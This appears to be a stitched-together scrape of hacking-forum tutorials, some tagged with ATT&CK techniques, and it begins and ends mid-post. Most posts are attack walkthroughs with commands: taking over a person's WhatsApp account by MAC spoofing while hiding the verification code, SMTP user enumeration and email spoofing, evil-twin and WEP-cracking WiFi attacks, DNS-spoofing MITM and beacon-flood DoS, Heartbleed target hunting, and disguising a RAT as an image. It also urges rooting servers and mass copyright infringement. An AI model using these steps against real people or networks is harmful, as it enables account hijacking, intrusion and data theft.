the user information. This table I have stumbled across appears to be for some type of admin login either with their CMS, shopping system or forum/blog. If you want to go down the route of exploiting their admin panel you certainly can and could even potentially gain access to the site and root the server and use for your own purposes along with being able to then strip the data of every other website hosted on that server. This should get you moving with the basics of SQLi Dumper"

This Topic will be updated regularly, So for getting the information put a comment here as if you will get every information which costs only one comment. also you can share your information here to help the people who are interested to be a hacker. Today I will share you about TYPES OF HACKERS : Hackers can be classified into different categories such as white hat, black hat, and grey hat, based on their intent of hacking a system. These different terms come from old Spaghetti Westerns, where the bad guy wears a black cowboy hat and the good guy wears a white hat. >White Hat Hackers White Hat hackers are also known as Ethical Hackers. They never intent to harm a system, rather they try to find out weaknesses in a computer or a network system as a part of penetration testing and vulnerability assessments. Ethical hacking is not illegal and it is one of the demanding jobs available in the IT industry. There are numerous companies that hire ethical hackers for penetration testing and vulnerability assessments. >Black Hat Hackers Black Hat hackers, also known as crackers, are those who hack in order to gain unauthorized access to a system and harm its operations or steal sensitive information. Black Hat hacking is always illegal because of its bad intent which includes stealing corporate data, violating privacy, damaging the system, blocking network communication, etc. >Grey Hat Hackers Grey hat hackers are a blend of both black hat and white hat hackers. They act without malicious intent but for their fun, they exploit a security weakness in a computer system or network without the owner’s permission or knowledge. Their intent is to bring the weakness to the attention of the owners and getting appreciation or a little bounty from the owners. >>>Miscellaneous Hackers Apart from the above well-known classes of hackers, we have the following categories of hackers based on what they hack and how they do it − »Red Hat Hackers Red hat hackers are again a blend of both black hat and white hat hackers. They are usually on the level of hacking government agencies, top-secret information hubs, and generally anything that falls under the category of sensitive information. »Blue Hat Hackers A blue hat hacker is someone outside computer security consulting firms who is used to bug-test a system prior to its launch. They look for loopholes that can be exploited and try to close these gaps. Microsoft also uses the term BlueHat to represent a series of security briefing events. »Elite Hackers This is a social status among hackers, which is used to describe the most skilled. Newly discovered exploits will circulate among these hackers. »Script Kiddie A script kiddie is a non-expert who breaks into computer systems by using pre-packaged automated tools written by others, usually with little understanding of the underlying concept, hence the term Kiddie. »Neophyte A neophyte, ""n00b"", or ""newbie"" or ""Green Hat Hacker"" is someone who is new to hacking or phreaking and has almost no knowledge or experience of the workings of technology and hacking. »Hacktivist A hacktivist is a hacker who utilizes technology to announce a social, ideological, religious, or political message. In general, most hacktivism involves website defacement or denialof-service attacks."

[TUT] Enable right click on websites,Proxy,,Author,https://hackforums.net/showthread.php?tid=6088639,"Hi All, Let us take a look at some of the ways to re-enable right click on websites & copy from right click disabled websites or blogs, which have turned it off on their web pages, via browser settings or by using third-party tools. A.Without Third Party tools Essentially the code which disables this feature and displays the window when you try to right-click on a web page is written in JavaScript. But there are some ways using which we can bypass it. 1. Using a Code method In this method, all you need to do is remember the string which you will find it in below pastebin address, or right it down at some place safe: Code https://pastebin.com/ZeXggs5z From now on, whenever you come across a web page, in which the right-click option has been disabled, just copy the above code, paste it in the browser address bar and hit enter. That’s it! You will now be able to access the right-click context menu options on the fly. But, the downside here is you need to use it every time in order to access the right-click menu. 2. Disabling JavaScript from Settings You can disable JavaScript and prevent the script running which disables right-click feature.This post will show you how to disable JavaScript in Internet Explorer, Chrome, Firefox & Opera. Once you have disabled JavaScript, come back to the web page and then reload it. Boom! You will be able to access the right click menu like a champ. But, the drawback with this method is that you are completely turning off the Javascript, which means it wouldn’t run any JavaScript codes at all, restricting the other functionalities of the web page. So, once are done copying, you need to re-enable JavaScript in your web browser again. 3. Other methods"

[TUT] How to check if VPN revealing your original IP or not,"Network Service Discovery,Network Sniffing",,Author,https://hackforums.net/showthread.php?tid=6087836,"A new security flaw can reveal your real IP address to prying eyes, even if you're using a VPN, and it's easy to exploit. Here's how it works, and what you can do about it. A recently discovered security flaw allows remote sites to take advantage of WebRTC (Web Real Time Communication, a feature built in to most browsers. A few lines of code is all it takes to remove the location protection you get from using a VPN, and figure out where you're actually located and who your internet service provider really is (who can then tie your address back to who you are specifically.) While the vulnerability is primarily browser-based right now, any application that can render web pages (and uses WebRTC) is affected, meaning anyone who wants to can see past your VPN to where you really are and who you really are. Advertisers, data brokers, and governments can use it to peek through your VPN to find out where your connection is really coming from. How Can I Check If My VPN Is Affected? Firefox and Chrome have implemented WebRTC that allow requests to STUN servers be made that will return the local and public IP addresses for the user. These request results are available to javascript, so you can now obtain a users local and public IP addresses in javascript. This demo is an example implementation of that. Additionally, these STUN requests are made outside of the normal XMLHttpRequest procedure, so they are not visible in the developer console or able to be blocked by plugins such as AdBlockPlus or Ghostery. This makes these types of requests available for online tracking if an advertiser sets up a STUN server with a wildcard domain. To see if your VPN is affected Visit: http://whatismyipaddress.com/ and Note down your actual ISP-provided IP address. Log in to your VPN, choose an exit server in another country (or use whichever exit server you prefer) and verify you're connected. Go back to What Is My IP Address and check your IP address again. You should see a new address, one that corresponds with your VPN and the country you selected. Visit Roseler's WebRTC test page Spoiler (Click to View) If both tools show your VPN's IP address, then you're in the clear.

Writing a simple python Viewbot,"Acquire Infrastructure,Scheduled Task/Job",,Author,https://hackforums.net/showthread.php?tid=6087025,"Introduction: Hey, so I've always personally loved bots. Bots are fascinating in the way they interact with webpages, the intricate bypassing, and more importantly the money behind them ✌ . This tutorial will give a brief look into: web requests, python, multi-threading, and web-based botting. Part One [What is a Bot?]: Depending on who you ask this definition may vary however I consider a bot to be something that automates a task. For this we will be using python. For setup I highly recommend using sublime text and installing yourself python3.7 however any text editor will do. Once you've got these installed fire up command prompt and type the following command: Code pip install requests This is important so we can get our libraries installed, if we don't get this installed then we can't use any of its modules. Part Two [Writing our Bot]: We are going to want to import the three libraries which we are using for this bot, in this case we will be using the random library , threading library, and also the requests library. After we have that imported lets get onto writing our viewbot itself: Code headers = {'user-agent': ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36""} One of the things which we will want to define is our user agent. When we click on a url we our sending it specific information in the header itself. This information tells the webpage what to load, however with botting scripts we use this make it look like our bot is a real person. next we want to create our function for loading our page, notice how I pass both the argument url,proxy these will be variables which I use in my program itself and MUST be passed w"

How to unblock yourself on Whatsapp,Account Manipulation,,Author,https://hackforums.net/showthread.php?tid=6072903,"IF SOMEONE BLOCKS YOU Step 1: Write down your blocker’s phone number If you have the contact that blocked you saved on your phone, write it down somewhere and delete it from your phone. Step 2: Back up your chats I believe you already know how to back up your WhatsApp chat (both messages and media files). Well, if you don’t then here is a quick guide to creating a Google Drive backup: Open WhatsApp. Go to Menu Button > Settings > Chats > Chat backup. Tap Back up to Google Drive and set up the backup frequency to your liking. You will be prompted to select a Google account that you will back up your chat history to. If you do not have a Google account, tap Add account when prompted. Please remember the Google account you are using for the backup. Tap Back up over to choose the network you wish to use for backup. Please note that backing up over cellular may result in additional data charges. Step 3: Delete your WhatsApp account Go to account settings on your WhatsApp and delete your account. By deleting your number, it means you are no longer active on WhatsApp so technically, you cannot block someone who’s not on WhatsApp. Whoever blocks you will no longer have you on the blocked list. Step 4: Clear WhatsApp data Now go to your phone settings > app > WhatsApp and clear the data. Step 5: Reactivate WhatsApp Open your WhatsApp and register your number on the WhatsApp platform. This time, you are registering for the first time over again. Step 6: Restore Chats Restore your chat back up. Make sure the same Google account that was used to perform the backup has been added to your phone. Uninstall and reinstall WhatsApp. After verifying your number, you will be prompted to restore your messages and media from Google Drive. After the restoration process is complete, tap Next and your chats will be displayed once initialization is complete. After restoring your chats, WhatsApp will begin restoring your media files. NOTE: You need to restore from the backup on your google drive but if you didn't do so, WhatsApp will automatically restore the backup from your local storage memory which could be SDcard or phone internal memory as the case may be. Step 7: Re-add contact Lastly, save the contact you wrote down earlier back on your phone. Now look for the person/ contact that blocked you in the first place and send a message. This is how to unlock your WhatsApp account whenever someone blocks you. I hope this is helpful."

Hack an Whatsapp Account Through MAC spoofing attack,"Network Sniffing,Remote System Discovery",,Author,https://hackforums.net/showthread.php?tid=6072908,"First of all the requirements of this procedure are: 1. Mobile Phone Rooted 2. Target's Phone for 5 minutes 3. Busybox and Terminal App installed on your android device 4. Wifi Scanner ( if you can't reach the target's phone for getting his / her mac address through settings ) Step 1: Uninstall WhatsApp from your phone or device. You'll install it again at the end of the method, but you'll need to configure it differently, and the easiest way to make sure you'll be able to do that correctly is to completely uninstall it now. Step 2: Obtain your target's phone. You'll need it for two different steps throughout the process, but this shouldn't take too long - you should be able to return it before your target starts to miss it. Step 3: Find your target's phone's Media Access Control (MAC) address. A MAC address is a unique identifier assigned to your phone or other device that essentially serves as its online identity. Find and write down your target's MAC address. It takes the form of six pairs of letters or numbers, separated by colons (01:23:45:67:89:ab). On an Android, find this in Settings → About phone → Status → Wi-Fi MAC address. On an iPhone, go to Settings → General → About → Wi-Fi Address. On a Windows phone, look in Settings → About → More info → MAC address. On a BlackBerry, go to Options → Device → Device and Status info → WLAN MAC. Step 4: . Find your MAC address using the instructions above. Make sure to save it somewhere secure, as you'll want to change your device back to that address once you're done. Step 5: Change (""spoof"") your phone's MAC address to that of your target. This will allow your phone to pass as your target's, letting you convince WhatsApp that you are your target when you log in. On an iPhone or other device, install a MAC spoofing app like MacDaddy X or WifiSpoof. Use that to change your MAC address. On Android, install BusyBox and the Terminal Emulator (apps available for free on Google Play). In the terminal, type ""ip link show"" to see a list of interfaces. Identify the one that has your MAC address -- for this example, we'll use the eth0 interface. In the terminal emulator, enter ""ip link set eth0 address XX:XX:XX:XX:XX:XX"" and ""ip link set eth0 broadcast XX:XX:XX:XX:XX:XX"", where eth0 is the interface you identified and XX:XX:XX:XX:XX:XX is your target's MAC address. To check that you've successfully changed your MAC address, enter ""ip link show eth0."" Step 6: Change (""spoof"") your phone's MAC address to that of your target. This will allow your phone to pass as your target's, letting you convince WhatsApp that you are your target when you log in. On an iPhone or other device, install a MAC spoofing app like MacDaddy X or WifiSpoof. Use that to change your MAC address. On Android, install BusyBox and the Terminal Emulator (apps available for free on Google Play). In the terminal, type ""ip link show"" to see a list of interfaces. Identify the one that has your MAC address -- for this example, we'll use the eth0 interface. In the terminal emulator, enter ""ip link set eth0 address XX:XX:XX:XX:XX:XX"" and ""ip link set eth0 broadcast XX:XX:XX:XX:XX:XX"", where eth0 is the interface you identified and XX:XX:XX:XX:XX:XX is your target's MAC address. To check that you've successfully changed your MAC address, enter ""ip link show eth0."" Step 7: Get the confirmation code from your target's phone. This code will be sent to their phone number as part of the WhatsApp configuration process. Access their phone one last time to get that verification code. Enter it into WhatsApp on your phone when prompted, and you're all ready to go. If you don't want your target to find out about your spoofing, make sure to delete the confirmation code from their phone before they can see it. Step 8: When you no longer need to access your target's WhatsApp account, change your MAC address back to what it was. Repeat the instructions to change it, but this time change it to your original address rather than your target's. This will restore your phone to how it was originally, which will ensure that there are no future problems with Internet usage or connectivity."

Retrieve (and spoof) email addresses from a website in 3 easy steps,"Valid accounts,Masquerading,Exploit Public-facing Application",,Author,https://hackforums.net/showthread.php?tid=5588411,"In this tutorial, you will need: Either Kali Linux or an operating system with Nmap installed Intro: Many websites have their own email addresses that they use to send and receive emails. How do they do this? They have an SMTP (Simple Mail Transport Protocol) server installed on their system, usually on port 25. This server contains a database of all the website's emails, and websites often leave it unsecured.So how would you leak their emails, send them funny messages, or even spoof their emails? Well read this tutorial and find out! Step 1: Open up your command line. Step 2: We will test to see whether or not the website left their SMTP server open. Enter the following command: Code telnet [website address] 25,465,587 If you receive a message like ""Connected to [IP Address]"" then congratulations! Their server is open. If not, then try ports 465 and 587. Step 3: Exit from telnet. We will now use nmap to extract email addresses from the SMTP server. Enter the following command: Code nmap --script smtp-enum-users.nse -p 25 [website address] Nmap should tell you all the user accounts on the server. Good, excellent! Now you have their email addresses. You can leak them to the public or send them random shit. If that's all you wanted to do then you can stop reading this tutorial. But what if you want to spoof their emails? How to Spoof: Step 1: Open up your command line Step 2: Enter the command Code telnet [website address] 25 Step 3: You are required to say hello to the server. Type the command: Code HELO [type anything here] and wait for the server to respond back. If you receive no response, try Code EHLO instead. Step 4: Type in the email address you want to spoof. Code MAIL FROM: [fake username]@[website address] and press enter Step 5: Type the email you would like to send a message to Code RCPT TO: [username]@[website address] and press enter Step 6: Type Code DATA and press enter.

THAT'S WHY I SAID PATIENCE IS A REQUIREMENT 👹.... PRO-TIP: 1) If you are using the message from the example then i suggest you to download some of the spoofed person(victim friend) pictures and use icon-changer to change your server icon to JPEG icon and put all that pics and your server to an .rar file and upload it to the hosting site.... Lol,,,, no one sees the extension if you do this thing.. 2) use rat's crew extension spoofer to change the extension to JPEG and change server icon to JPEG too.…"

How to change the mac address of your Router,"Masquerading,Hide Artifacts",,Author,https://hackforums.net/showthread.php?tid=6072901,"A simple noob tutorial. All network hardware is assigned a special unique identifier, the Media Access Control (MAC) address during production by its manufacturer. It helps identify the device on the network. Sometimes it is necessary to change that id and use a particular MAC address to be able to connect to your ISP. Below is a general guideline on how to do so on many routers/gateways and ADSL/VoIP/cable modems. Here are the necessary steps to change the MAC address on your device: 1. Get to the web admin interface of your device. You will have to find your router/modem's IP address. If you're connected to it, you can drop to command prompt and type: ipconfig (the IP address of your ""Default Gateway"" should be the router/modem's IP). Some of the most common IPs are: Motorola SB modems: 192.168.100.1 Other modems/routers: 192.168.1.1 You can also lookup the default IP and login information of your device in our hardware database. 2. Find the correct menu to change your MAC address It is usually in ""Setup > Advanced"", you're looking for a menu called ""MAC Address Clone"". This should let you enter your own MAC address, it is designed to clone the MAC address of your network card. Note that this menu may not be available on all devices, or it may only be available to be provisioned by your ISP. In such cases, you may have to call them and ask them to ""reprovision"" your modem."

Now this is actually part two of the series, part one can be found here. Now i can jump straight into the point and show you how to do this or that, but what's the point if you don't know the basics ? you can literally follow me but once you have to figure out something on your own, you will struggle. In the previous tutorial I was talking about types of scanning, tools you can use and some examples of spoofed dos. Now we will be talking about TCP/IP, UDP and OSI. Let's start with OSI (Open Systems Interconnection) model, you should know it better than your birthday. It consists of 7 Layers Physical Data Link Network Transport Session Presentation Application Let's begin with the first one, which is the Physical layer: [Physical structure, Coax, Fiber, Wireless, Hubs, Repeaters] It conveys the bitstream thru the network, either at optical, radio or electrical level. It also provides a hardware (sending and receiving data on a network). Data Link Layer: [Frames, Ethernet, Switches, Bridge] This layer sets up links across the physical network, putting packets into network frames. It also has 2 sub layers (first is logical link control layer and the second one is Media access control layer). However ethernet is the main data link layer in use. Network Layer: [Packets, IP, ICMP, IPSec, IGMP] Remember that it handles the addressing and routing of the data, meaning it's sending it in the right direction to the right destination on outgoing and receiving incoming transmissions at the packet level. Transport Layer: [End-to-End communications, TCP, UDP] Transport Layer manages packetization of the data and then delivery of the packets, it is also checking for any errors in the data once it is transmitted. As we will discuss soon, TCP and UDP also does that. Session Layer: [Synch and send to port, API's, WinSock, Sockets] Sets up coordinates and terminate conversations, take it as a service that authenticate and reconnects after an interruption. Presentation Layer: [SSL, SSH, IMAP, FTP, MPEG, JPEG, NCP, AFP, TDI] It is part of the OS and it converts incoming/outgoing data from one presentation format to another. For instance, clear text to encrypted text at one end, and back to clear text the other. Application Layer: [HTTP, FTP, IRC, SSH, DNS, TELNET] This is a layer at which communication partners are identified. Network capacity is assessed (Will the network let me talk to them right now?), and that creates a thing to send or opens the thing received. Brief overview of TCP: It is second transport layer protocol. Connection-oriented protocol (Meaning it's reliable), don't confuse it with UDP as it's connectionless protocol. Uses flow and error control mechanism at the transport layer. It is heavy compared to UDP because it ensure that the packet has been delivered or not, if not simply resends that packet and it must be delivered sequentially. Now, let's see what happens to a packet inside the network traffic, note that the data unit transferred between two end points has different names in each layer. Layer 5/6/7 application layers is called data, in Layer 4 (Transport) it's segment for TCP and datagram for UDP, in Layer 3 (The network layer) it's called packet, and of course in Layer 2 it's Frame. Let's look at the relationship between the OSI and computer system, I will try to explain it the way you can understand without confusions.

Advanced attacks on WiFi infrastructure and its clients - Tutorial - part 4,"Adversary-in-the-Middle,Steal web session Cookie,Remote System Discovery",,,https://hackforums.net/showthread.php?tid=6072408,"HIRTE TYPE ATTACK This attack is an extended version of the caffe latte attack. Its basic premise is to use the packet fragmentation technique, which allows any packet to be used to carry out an attack, not limiting itself to ARP protocol packets (it can also be an IP packet). However, in this attack, we generate packages in such a way that the client responds to them (and we generate the packages themselves based on packages from the client). Each packet, whether ARP or IP has specific fields such as the client's IP address and destination MAC address. Our goal is to ""transfer"" the source address to another item in the package. Normally we are not able to change the position of bytes in packets because such a packet would be invalidated (the checksum of the packet would not match and would be rejected as incorrect). So to do this we divide the package into two parts and then send it to the customer. I know it sounds quite complicated, so let's try to conduct such an attack in practice. If you would like to know more about this attack, I invite you to visit the aircrack-ng package page where this attack is described in detail. Using the airbase-ng command, create a WEP access point exactly as we did during a caffe latte attack. The only change is that instead of the ""L"" option, use the ""N"" option, which causes a hirte attack. Code airbase-ng -c CHANNEL -a BSSID -e ESSID -W 1 -N INTERFACE Then open a new console window where we run the airodump-ng command which will collect packages from the access point: Code airodump-ng -c CHANNEL --bssid BSSID_EVIL_AP --write /PATH/TO/SAVE/FILE/IN/PACKAGES.CAP INTERFACE Just like during a caffe latte attack, as soon as the client connects, airbase-ng will start the hirte attack. Now just run the command aircrack-ng which after processing the appropriate number of packages will break the WEP key. 7. MAN-IN-THE-MIDDLE ATTACKS MITM attacks are probably the most effective and most common attacks on wireless networks. There are many configurations for such attacks. We will focus on the most common type, when the attacker connects to the Internet via LAN and creates a fake access point. Such an access point broadcasts a WiFi network whose SSID is the same as the identifier of the attacked nearby network. An authorized user of the attacked network may accidentally connect to such a false access point (or such a connection may be ""forced"" by using the stronger signal theory, which we discussed earlier). I described the implementation of such an attack earlier in point 3 so I will not repeat myself, and I will only describe this attack in theory and I'll leave it to you. The first step will be to create an access point to which customers will connect. Later you need to create a bridge between the access point and the cable interface (the original network interface). After creating the bridge, run all interfaces (it's also worth giving the IP address to our bridge, you can do it with the ifconfig command) with the ifconfig command. The next step will be to enable packet forwarding. If you follow all the steps correctly, you should be able to eavesdrop on the exchange of packets in both directions (between the AP and the cable interface). All you have to do is start the sniffer and save everything that flies online. - SESSION CAPTURE One of the many attacks that can be carried out using a MiTM attack is interception of application sessions. An interesting element of this process is the ability to modify data in forwarded packets (if they are not encrypted or do not use other data integrity safeguards). In practice, this means that the attacker can modify, damage and in extreme cases even selectively remove selected packages. In this attack vector, I will show you how to capture a DNS session using a Man-in-the-Middle attack. And then, based on the captured DNS session, it will show you how to capture a browser session trying to connect to google.com (or any other host). Let's assume that we successfully used the MiTM attack in the attacked network. Let's start the sniffer (in this case it will be wireshark) with the dns filter enabled (just enter the phrase ""dns"" in the filter field to display only packages of this protocol). Now just use the dnsspoof tool and show him the interface on which to work. In addition, let's create a text file called hosts.txt in which we will put an entry redirecting to the ip address of the attacker all queries regarding the google.com domain. Then issue the command: Code dnsspoof -i INTERFACE -f hosts.txt After executing this command, all DNS queries sent over the network will go through dnsspoof. Now if the victim tried to visit www.google.com they would receive an error message. This is because dnsspoof sends fake dns responses to the attacker's computer on which the google service is not running (that is, it simply does not find the service on the attacker's computer, exactly on port 80). For the purposes of this example, start the apache server that will replace the google service. So let's give the command: Code apache2ctl start Or Code service apache2 start From this moment, when the victim sends a dns query about the google site, he will be redirected to the address of the attacker where the apache server is running. Based on this example, we can clearly see the possibilities of MiTM attacks. This is one of the simplest attacks that can be carried out, I leave the exploration of the more advanced ones to you. The internet is full of information on this subject. Just search well."
Advanced attacks on WiFi infrastructure and its clients - Tutorial - part 3,"Network sniffing,Input Capture",,,https://hackforums.net/showthread.php?tid=6072407,"HONEYPOT AND MISASSOCIATION ATTACKS In the default configuration, the wireless client in a specified period of time probes available wireless networks in search of APs to which it previously connected. In addition to the so-called preferred networks, devices poll all available wireless networks in range to allow connection to them. From the attacker's perspective, this situation creates two possible attack scenarios. The first is to monitor customer polling and create a malicious access point that will pretend to be the one the client is looking for. The second is to create a clone of the attacked network that will try to convince users to connect to it, but remaining in close proximity to the original access point. You probably came to the conclusion that these two attack vectors do not differ from each other and that they are similar to evil twin attacks. Yes, it's true, but the difference is passive waiting for the client to connect to our malicious AP. In these attacks, we do not use DoS techniques to force the client to connect. At the very beginning let's determine if our range includes clients not connected to any AP (since they are not associated with any AP, we can safely assume that they are probing the environment in search of known access points). We give the command: Code airodump-ng INTERFACE Observing the bottom table with customer addresses, we can see that there are customers not connected to any AP (this can be seen by the message NOT ASSOCIATED). Now all you need to know is exactly what access point the customer is looking for. For this purpose, we can use a sniffer and BPF filter to find ESSID in probe request packets. In our example, we will use wireshark, and the filter itself will look like this: Code wlan.fc.type_subtype == 0x04 && wlan.sa == CLIENT_MAC_Address You should now only see probe request packages from the client and should contain the ESSID of the network. Now just create a fake access point pretending to be the client’s network. To perform this task we will use the airbase-ng command: Code airbase-ng -e ESSID_FAILABLE_ NETWORK -c CHANNEL INTERFACE Now, within a few minutes, the client should connect to the substituted access point. The second attack vector consists of creating an AP identical to the original AP working on the same channel. Later, wait for the client to connect to our network or force him to do so through one of the attacks discussed earlier. This task is not difficult so I leave it to you. 5. CAFFE LATTE TYPE ATTACK This vector of attack on the WEP protocol that will allow to capture the WEP key based on the analysis of the client itself. If the client was previously connected to a network using WEP, most operating systems ""cache"" such a key. When the client tries to connect to such a network again, the key is extracted from the buffer mentioned above. During the attack, the client does not have to be connected or be near the network being attacked - the WEP key of the network is obtained directly through the appropriate use of an isolated client (of course, we must first ensure that the client connects to the network with WEP encryption). First, make sure that the client is not connected to the AP and is probing the network using WEP. We give the command: Code airodump-ng INTERFACE Now let's create a fake AP with the ESSID and BSSID the client is looking for. The command will look something like this: Code airbase-ng -c CHANNEL -a BSSID_AP -e ESSID_AP -L -W 1 INTERFACE Most of the syntax for this command is understandable, the ""L"" argument is used to indicate a caffe latte attack, while the ""W"" option is used to set a flag in beacon packages. The option for this argument is set by the numbers 0 and 1. In our case, the folds are on. Now when the client connects to our access point, the airbase-ng command will immediately start the caffe latte attack. The next step to complete will be collecting packages from our fake access point. The following command will be used: Code airodump-ng –b BSSID_AP -c CHANNEL --write /PATH/TO/SAVE/FILE/IN/PACKAGES.CAP INTERFACE At the same time, launch the aircrack command in a new console window that will break our WEP key: Code aircrack-ng FILE_NAME_WHER_PROVED_PACKAGES.CAP After collecting the appropriate number of packets (called initialization vectors - IV), the aircrack command will successfully decrypt the WEP key."
Advanced attacks on WiFi infrastructure and its clients - Tutorial - part 1,"Masquerading,Network Denial of Service",,,https://hackforums.net/showthread.php?tid=6072404,"Hello🙂 In this guide, I decided to describe a few more advanced attacks on the infrastructure of the WLAN and its clients. At the very beginning I'm going to discuss techniques such as DOS attacks, bad twin attacks, an unauthorized access point. In the rest of this guide, I will also discuss techniques such as Honeypot and Misassociation attacks, Caffe Latte attacks, Hirte attacks and MiTM-based attacks (session and network capture). The structure of this guide will be very chaotic but I hope that those interested will definitely choose ""something for themselves"". For obvious reasons, I will not describe techniques such as dictionary attacks, default access point passwords, etc. In earlier guides I have described these topics and it will be useless to describe them again. In addition, the forum will have a lot of threads on the above topics. At the very beginning, let's replace the necessary hardware and software to perform the tasks. NECESSARY EQUIPMENT: - linux computer (in my case it's Debian/Kali Linux as usual) - network card that supports mixed mode and packet injection (I use two cards for my own comfort, especially for bad twin attacks and other based on jamming access points / creating fake APs. Of course, you can use one network card (I usually recommend Alfa Networks cards that are great with it)). In addition, I recommend buying an external antenna but it is not required. - internet connection (to download software/update the operating system). NECESSARY SOFTWARE: If you use the Kali Linux system, most of the tools you have pre-installed, some of the software is available on github, repositories of your operating system and other similar platforms. As for other operating systems, you can find information on how to install the software on the internet. - aircrack-ng - mdk3 - brctl (Bridge Network Connections) - wireshark or tcpdump - dnsspoof - apache2 As usual, let's start by updating our operating system: Code apt-get update && apt-get dist-upgrade After installing the tools and updating the system, connect our network card. Then switch it to monitor mode, while killing all processes in the system that will interfere with the card's operation: Code airmon-ng check kill Code airmon-ng start INTERFACE or you can use the Code iwconfig INTERFACE mode Monitor command for this purpose Now we should be ready for work. 1. DOS ATTACKS Due to their nature, wireless networks are susceptible to a number of denial of service attacks. During an attack, an attacker sends a broadcast that interferes with (sequences of packets also called control frames) wireless performance or prevents it from working. Unfortunately, no network can be completely protected against such attacks, although the 802.11 standard has improved the situation in this area by adding selection that prevents the same messages from being broadcast. There are many types of this type of attacks, below I will try to list and briefly describe those that in my opinion are the most useful and which I use at work. We will use the mdk3 program to implement the attacks. Its syntax is very simple, I recommend looking into the man's manual of this program for information on all its functions. - BEACON FLOOD MODE This attack involves sending beacon frames to the ether to broadcast the presence of fictitious AP (Access Point), which are most often ""clones"" of the attacked network. This will prevent users from connecting to the original access point. Such an attack does not ""drown out"" the network itself, so in practice this technique is used when we want to block access to a given network by hiding it among hundreds of other identical-looking networks. In addition, I note that this attack is very destructive and in some cases can lead to disruption of network monitoring systems and in the worst case can damage hardware drivers. To carry out this attack, we will use the command: Code mdk3 INTERFACE b -n ""NETWORK SSID"" -w /PATH/TO/FILE.TXT -c CHANNEL the ""b"" parameter indicates the type of attack while the ""w"" specifies the white list of MAC addresses that will not be taken into account during the attack. If the file is not specified, all addresses will be attacked."

I'm going to turn my adapter off, turn on monitor mode and turn my adapter back on with the following commands, Code ifconfig wlan0 down Code iwconfig wlan0 mode monitor Code ifconfig wlan0 up [img]i.imgur. com/Ve07fdh.png[/img] Fig.2 You can alternatively use Aircrack commands to list adapters and enable monitor mode. Aircrack is installed as factory with kali. The reason i don't use them is because the Alfa AWUS036AV doesn't have interface monitoring and will not work with this step of Aircrack however works perfectly fine with the previous steps. The following commands to execute using Aircrack are, This will list all available devices that can enable monitor mode. Code airmon-ng This will start monitor mode for device wlan0. Code airmon-ng start wlan0 Scanning the Surrounding Area Now you have enabled monitor mode on your device with either of these steps it's time to start scanning the surrounding area. The following command will scan all surrounding networks. Code airodump-ng wlan0 [img]i.imgur. com/BABjnig.png[/img] Fig.3 After a few minutes many networks will start to relay information back to your shell like above, it's important to note everything up until this point is perfectly legal but any further attacks on networks you don't own or don't have permission to be on is not allowed. Targeting Our Network From here you need to run, Code airodump-ng --bssid [BSSID NUMBER] -c 11 -w capture wlan0 This command will open a similar interface to before but specifically capturing information sent and received by the bssid provided. You will need to monitor this network until you log a wpa handshake, a 4 way authentication process between two devices that will be saved as a packet capture file .cap, from here convert your .cap file with hashcat cap2hccapx converter, then you can attempt to crack your new .hccapx file."

Goldmine Ebooks Information [No Bullshitry Links],NA,,,https://hackforums.net/showthread.php?tid=6068856,"Information is power. But like all power, there are those who want to keep it for themselves. The world's entire scientific and cultural heritage, published over centuries in books and journals, is increasingly being digitized and locked up by a handful of private corporations. Want to read the papers featuring the most famous results of the sciences? You'll need to send enormous amounts to publishers like Reed Elsevier. There are those struggling to change this. The Open Access Movement has fought valiantly to ensure that scientists do not sign their copyrights away but instead ensure their work is published on the Internet, under terms that allow anyone to access it. But even under the best scenarios, their work will only apply to things published in the future. Everything up until now will have been lost. That is too high a price to pay. Forcing academics to pay money to read the work of their colleagues? Scanning entire libraries but only allowing the folks at Google to read them? Providing scientific articles to those at elite universities in the First World, but not to children in the Global South? It's outrageous and unacceptable. ""I agree,"" many say, ""but what can we do? The companies hold the copyrights, they make enormous amounts of money by charging for access, and it's perfectly legal — there's nothing we can do to stop them."" But there is something we can, something that's already being done: we can fight back. Those with access to these resources — students, librarians, scientists — you have been given a privilege. You get to feed at this banquet of knowledge while the rest of the world is locked out. But you need not — indeed, morally, you cannot — keep this privilege for yourselves. You have a duty to share it with the world. And you have: trading passwords with colleagues, filling download requests for friends. Meanwhile, those who have been locked out are not standing idly by. You have been sneaking through holes and climbing over fences, liberating the information locked up by the publishers and sharing them with your friends. But all of this action goes on in the dark, hidden underground. It's called stealing or piracy, as if sharing a wealth of knowledge were the moral equivalent of plundering a ship and murdering its crew. But sharing isn't immoral — it's a moral imperative. Only those blinded by greed would refuse to let a friend make a copy. Large corporations, of course, are blinded by greed. The laws under which they operate require it — their shareholders would revolt at anything less. And the politicians they have bought off back them, passing laws giving them the exclusive power to decide who can make copies. There is no justice in following unjust laws. It's time to come into the light and, in the grand tradition of civil disobedience, declare our opposition to this private theft of public culture. We need to take information, wherever it is stored, make our copies and share them with the world. We need to take stuff that's out of copyright and add it to the archive. We need to buy secret databases and put them on the Web. We need to download scientific journals and upload them to file sharing networks. We need to fight for Guerilla Open Access. With enough of us, around the world, we'll not just send a strong message opposing the privatization of knowledge — we'll make it a thing of the past. Will you join us?"

This vulnerability, classified as a buffer over-read, results from a missing bound check in the handling of the Transport Layer Security (TLS) heartbeat extension, the heartbeat being behind the bug's name."" A explanation of heartbleed taken from https://en.wikipedia.org/wiki/Heartbleed. In other words, Heartbleed is a vulnerability that pretty much allows you to obtain data being sent allowing you to obtain information like usernames, passwords, emails, etc. Which Sites Are Vulnerable: When this exploit first came out (April 3, 2014) every site using SSL was vulnerable to this causing a very big problem for even the biggest of sites. At 1 point sites like google,Tumblr, etc were vulnerable but most big sites have been patched an hour or a day into the discovery. Due to this being an old exploit it is mostly patched on all SSL sites but can still be abused on 100's of websites. These SSL versions are at the moment vulnerable and patched: OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable To find a site that is vulnerable download the following plugins on your web browser: Chrome Bleed: Chrome Bleed Link Firefox Heartbleed: Firefox Heartbleed Vuln Checker You may also use 1 of these 2 sites: http://tif.mcafee.com/heartbleedtest https://filippo.io/Heartbleed/ To find vulnerable websites try using this dork in a google search: inurl:https:// If you wanna target a certain type of site just type in a keyword before the dork I provided.

